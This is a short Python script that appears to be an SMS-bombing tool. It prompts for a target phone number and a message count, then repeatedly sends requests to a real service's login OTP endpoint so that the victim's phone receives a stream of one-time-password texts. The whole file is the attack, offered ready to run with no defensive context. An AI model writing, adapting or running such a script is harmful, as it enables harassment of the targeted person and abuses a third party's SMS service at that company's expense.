import requests
import time
from time import sleep

number = str(input("Enter your target number : "))
amount = int(input("Enter amount : "))

api="https://stage.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operator=bd-otp"

for a in range(amount):
	requests.get(api)
	print("SMS Sent")
	time.sleep(10)
	